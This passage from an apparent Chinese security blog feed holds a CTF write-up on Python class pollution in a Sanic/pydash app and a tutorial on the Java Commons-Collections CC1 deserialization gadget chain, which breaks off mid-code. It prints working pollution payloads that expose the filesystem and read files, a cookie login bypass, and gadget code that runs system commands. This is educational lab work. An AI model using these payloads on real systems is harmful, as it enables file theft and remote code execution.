class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"><span class="comment"># Session(app)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># async def index(request):</span></span><br><span class="line"><span class="comment">#     return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route(&quot;/login&quot;)</span></span><br><span class="line"><span class="comment"># async def login(request):</span></span><br><span class="line"><span class="comment">#     user = request.cookies.get(&quot;user&quot;)</span></span><br><span class="line"><span class="comment">#     if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class="line"><span class="comment">#         request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class="line"><span class="comment">#         return text(&quot;login success&quot;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return text(&quot;login fail&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line"><span class="comment">#    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span></span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     return text(&quot;forbidden&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">8000</span>)<span class="comment"># 修改地址为本地</span></span><br></pre></td></tr></table></figure><p>在src处打断点</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008144256970.png"></p><p>然后重新访问<code>/src</code>，我们要分析的是与路由有关的方法和变量，需要知道的是，<code>app.router</code> 是 Sanic 中管理所有路由的对象，负责存储和调度请求对应的处理函数，找到<code>app.router</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251008144620051.png"></p><p>有点多，看着会有点晕，不过因为<code>directory_view</code>是在<code>static</code>方法下，所以我们找有关<code>static</code>的路由即可，发现<code>name_index</code>、<code>routes_all</code>等符合条件</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008150318175.png"></p><p>然后我们修改src代码，方便后续调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;code&#x27;</span>))<span class="comment"># 加个eval用于执行代码</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p><code>name_index</code> 是一个内部字典，键是路由的名字，值是这个路由对应的路由对象。我们可以通过<code>app.router.name_index[]</code>来查看注册路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/src?code=print(app.router.name_index)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251007231134991.png"></p><p><code>__mp_main__.static</code>对应的路径为<code>static/&lt;__file_uri__:path&gt;</code>，意味着它会匹配 <code>/static/</code> 目录下的文件请求，我们可以通过<code>app.router.name_index[&#39;__mp_main__.static&#39;]</code>查看具体信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007231555979.png"></p><p>接下来分析如何调用到<code>DirectoryHandler</code>里，全局搜索<code>name_index</code>，看看是如何定义的</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007232207959.png"></p><p>我们在这里打个断点，然后回到<code>main.py</code>进行调试分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007232429606.png"></p><p>可以看到具体的属性</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007233040019.png"></p><p>我们直接读取<code>directory_view</code>的值看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/src?code=print(app.router.name_index[&#x27;__mp_main__.static&#x27;].handler.keywords[&#x27;directory_handler&#x27;].directory_view)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251007233227292.png"></p><p>可以看到返回值为false，尝试污染参数试试，因为<code>__mp_main__.static</code>这个路由名称本身就含有<code>.</code>，点号不是分隔符，因此用两个反斜杠即可</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251007234006016.png"></p><p>再次查看参数值，可以看到成功污染</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007234052186.png"></p><p>在当前目录新建<code>/static/</code>目录（随便放个文件），然后浏览器访问测试，成功查看到内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007234357806.png"></p><p>如果我们尝试用<code>routes_all</code>的话会发现不行，可以自行测试看看</p><p>接下来就是污染<code>directory</code>的路径，但是却发现报错了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251007235555639.png"></p><p>说明不能这样子污染，我们继续调试代码，发现是<code>directory</code>对象的<code>parts</code>属性控制的值，但这是个元组，不能直接修改</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007235952427.png"></p><p>那我们回到<code>directory.py</code>分析<code>directory</code>是如何定义的，可以看到有个<code>Path</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008133306093.png"></p><p>跟进<code>Path</code>方法，然后定位到<code>__new__</code> 方法，当用户通过 <code>Path()</code> 创建路径对象时会自动调用<code>__new__</code>方法</p><p>这里有个需要注意的点，如果你用的Python版本比较新（例如Python3.12），则<code>__new__</code> 方法内容如下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008133817598.png"></p><p>完全没有可利用的点，在这里卡了很久，跟网上的教程案例不太一样，后面发现是新版本修复了这里，可以通过降低Python版本解决（如Python3.9），但是之前用Python3.12创建的venv环境就不能用了，需要重新创建一个，有点麻烦</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008134149285.png"></p><p>发现调用了<code>_from_parts</code>方法，继续跟进</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008134328401.png"></p><p>其中<code>self._parts = parts</code> 里的 <code>parts</code> 是 <code>_parse_args</code> 方法解析传入路径参数后得到的路径组成部分列表，假如<code>args</code> 为<code>(&#39;usr/local/bin&#39;,)</code>，那么<code>_parse_args</code> 会把它切分为三部分：drv为空，root为空，parts 为 <code>[&#39;usr&#39;, &#39;local&#39;, &#39;bin&#39;]</code></p><p><code>parts</code>会把值传给<code>_parts</code>，我们看能不能控制，尝试访问<code>_parts</code>属性</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008134928001.png"></p><p>返回了数组而不是元组，也就是说可以进行修改了，我们可以通过污染<code>_parts</code>来指定目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008135056118.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;E:\\test&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>传入后再重新读取<code>_parts</code>属性，成功修改</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008135645778.png"></p><p>本地调试完了，咱们重新回到ctfshow</p><h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>先访问<code>/login</code>传入Cookie登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot;adm\073n&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251008135955086.png"></p><p>然后污染<code>directory_view</code>为true</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>接着污染<code>directory._parts</code>为根目录</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>再次访问<code>/static/</code>查看根目录内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008140350414.png"></p><p>可以看到flag名为<code>24bcbd0192e591d6ded1_flag</code>，我们污染<code>__file__</code>为目标文件路径</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后访问<code>/src</code>读取即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20251008140649112.png"></p><p>至此复现完成，前前后后在网上参考了很多资料，确实挺难的，不过收获挺大，继续加油</p>]]></content>
    
    
    <summary type="html">Python污染链分析 2024CISCN Sanic复现</summary>
    
    
    
    <category term="Python安全" scheme="https://waynejoon.github.io/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python安全" scheme="https://waynejoon.github.io/tags/Python%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化 CC1链分析</title>
    <link href="https://waynejoon.github.io/posts/java-cc1-gadget-chain-analysis/"/>
    <id>https://waynejoon.github.io/posts/java-cc1-gadget-chain-analysis/</id>
    <published>2025-10-04T14:26:34.000Z</published>
    <updated>2025-11-10T04:10:14.872Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CC1链子介绍"><a href="#CC1链子介绍" class="headerlink" title="CC1链子介绍"></a>CC1链子介绍</h2><p>Commons Collections是Apache开源社区推出的一款针对Java集合框架的扩展工具库，它提供了大量额外的数据结构和算法，包括有序集合、队列、堆、双向映射等功能丰富的集合实现，以及诸如过滤、转换等高级操作接口。该库极大地补充和完善了Java标准集合API，让开发者在处理复杂集合数据时更加高效灵活，同时简化了代码编写，是Java项目中广泛应用的实用工具</p><p>CC1链分国内（<code>TransformedMap</code>）和国外（<code>LazyMap</code>），本文介绍的是国内的<code>TransformedMap</code>链，该链相比国外，结构更为直接，调用链清晰，适合快速构造验证和理解</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="下载安装-JDK-8u65"><a href="#下载安装-JDK-8u65" class="headerlink" title="下载安装 JDK-8u65"></a>下载安装 JDK-8u65</h3><p>官网：<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">Java 存档下载 — Java SE 8 | Oracle 中国</a></p><p><img src="https://oss.waynejoons.icu/picphoto/20250927103032876.png"></p><p>安装之后配置到IDEA，在右上角文件处打开项目结构，或者直接用快捷键 <code>Ctrl+Alt+Shift+S</code> 打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927103148260.png"></p><p>然后在项目处选择SDK为<code>JDK 1.8.0_65</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250927103457215.png"></p><h3 id="通过Maven下载CommonsCollections3-2-1"><a href="#通过Maven下载CommonsCollections3-2-1" class="headerlink" title="通过Maven下载CommonsCollections3.2.1"></a>通过Maven下载CommonsCollections3.2.1</h3><p>复制以下代码到<code>pom.xml</code>的<code>&lt;dependencies&gt;</code>标签里面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250927104212668.png"></p><p>保存即可</p><h3 id="配置对应源码"><a href="#配置对应源码" class="headerlink" title="配置对应源码"></a>配置对应源码</h3><p>jdk自带的包里面有些文件是反编译的<code>.class</code>文件，不利于研究分析，为方便调试，我们安装对应的源码</p><p>下载地址：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4</a></p><p>点击zip下载压缩包，然后自行解压</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927110349349.png"></p><p>在我们之前安装的<code>jdk8u_65</code>文件夹中，找到<code>src.zip</code>的压缩包，解压到当前文件夹下，然后把<code>jdk-af660750b2f4\src\share\classes</code>里的sun文件夹复制到<code>jdk8u_65</code>文件夹中的src里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927111213011.png"></p><p>接着打开IDEA，在项目结构（<code>Ctrl+Alt+Shift+S</code>）里面找到SDK处，在源路径添加<code>jdk8u_65</code>的src文件夹，保存</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927111423167.png"></p><p>到这里就配置完成了，可以开始调试分析了</p><h2 id="CC1链分析"><a href="#CC1链分析" class="headerlink" title="CC1链分析"></a>CC1链分析</h2><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>CC1源头就是Commons Collections库中的<code>Tranformer</code>接口，里面有个<code>transform</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927133715573.png"></p><p>寻找继承了这个接口的类，看看<code>transform</code>方法是如何实现的，可以快捷键<code>Ctrl+Alt+B</code>快速查看实现方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927135856858.png"></p><p>发现<code>InvokerTransformer</code>类继承了该接口，重写了<code>transform</code>方法，同时还继承了<code>Serializable</code>接口，符合我们的要求</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927140059900.png"></p><p>可以看到，这些参数都是可以控制的，那我们利用这点，传入参数调用<code>invoke</code>函数就可以触发任意类任意方法</p><p>我们的目标是实现<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></p><p>构建以下代码实现，方法名为<code>exec</code>，参数类型为<code>String</code>，值为<code>calc</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://oss.waynejoons.icu/picphoto/20250927141103994.png"></p><h3 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h3><p>接下来就是一步步回溯，寻找可以利用的类，直到到达重写后的<code>readObject()</code>方法</p><p>首先先寻找有哪些类的哪些方法调用了<code>transform</code>，右键点击查找用法（或者<code>Alt+F7</code>）</p><p>发现<code>TransformedMap</code>类的<code>checkSetValue</code>方法调用了<code>transform</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250929140804672.png"></p><p>再看看<code>TransformedMap</code>类的构造函数，可以看到由三个参数组成</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929141101281.png"></p><p>其中第一个参数为<code>Map</code>类型，我们可以传入<code>HashMap</code>，第二和第三个参数为<code>Transformer</code>类型，同样可控</p><p>但是需要注意的是，<code>TransformedMap</code>构造函数属于<code>Protected</code>方法，不能通过外部直接调用，但很巧的是，在<code>TransformedMap</code>类找到了<code>decorate</code>方法，返回一个<code>TransformedMap</code>的实例对象，且属于<code>Public static</code>方法，外部可以直接调用</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929142026206.png"></p><p>那我们可以构造代码，第一个参数传入<code>map</code>，第二个用不到就传个null，第三个参数传入<code>invokerTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br></pre></td></tr></table></figure><p>接下来就是要找哪里调用了<code>checkSetValue</code>方法，右键查找用法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929145517746.png"></p><p>发现有且仅有一处调用了<code>checkSetValue</code>方法，类名为<code>AbstractInputCheckedMapDecorator</code>，然后<code>TransformedMap</code>类刚好又继承了<code>AbstractInputCheckedMapDecorator</code>类</p><p>而<code>AbstractInputCheckedMapDecorator</code>类又继承了<code>AbstractMapDecorator</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250929150113874.png"></p><p><code>AbstractMapDecorator</code>实现了Map接口</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929150412316.png"></p><p>而Map接口里的Entry有<code>setValue</code>方法，也就是说<code>AbstractInputCheckedMapDecorator</code>重写了<code>setValue</code>方法，而重写后的方法调用了<code>checkSetValue</code>，刚好符合我们的要求</p><p>因此我们对Map进行遍历，使其调用重写后的<code>setValue</code>方法，进而调用<code>checkSetValue</code>，执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(r);</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformermap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251004213455658.png"></p><p>成功弹出计算器</p><p>接下来我们继续分析，寻找哪些方法调用了<code>setValue</code>，右键查找用法</p><p>发现<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法调用了<code>setValue</code>，刚好满足我们的要求，也寻到了入口，一举两得</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929195017952.png"></p><p>查看<code>AnnotationInvocationHandler</code>的构造函数，参数为一个Class对象和一个Map对象，其中Class对象继承自<code>Annotation</code>，需要我们传一个注解类进去，然后<code>memberValues</code>传入之前的<code>transformermap</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250929195540206.png"></p><p>再看看<code>AnnotationInvocationHandler</code>的访问权限，发现并没有<code>Public</code>等访问修饰符，则默认表示<code>Package-local</code>方法，即只能在同一个包下访问，在包外的类中是不可见的，无法调用</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929200113453.png"></p><p>但可以通过反射调用方法<code>getDeclaredConstructor</code>来获取声明构造函数，简单修改后就可以实现包外调用，这里介绍一下与<code>getConstructor</code>的区别</p><table><thead><tr><th align="left">方法</th><th align="left">查找范围</th><th align="left">返回哪些方法</th><th align="left">是否支持私有&#x2F;受保护方法</th></tr></thead><tbody><tr><td align="left">getDeclaredConstructor 获取声明方法</td><td align="left">只查本类</td><td align="left">所有声明（包括私有、受保护等）</td><td align="left">支持（需 setAccessible(true)）</td></tr><tr><td align="left">getConstructor 获取方法</td><td align="left">本类和父类链</td><td align="left">仅public方法（含继承）</td><td align="left">不支持</td></tr></tbody></table><p>因此我们通过反射来获取这个类，修改访问权限后就可以在外部调用了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<span class="comment">//获取构造器</span></span><br><span class="line">annotationConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//修改访问权限</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Override.class,transformermap);</span><br></pre></td></tr></table></figure><p>拼接上之前的内容，就形成骨架，完成百分之七八十了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(r);</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title 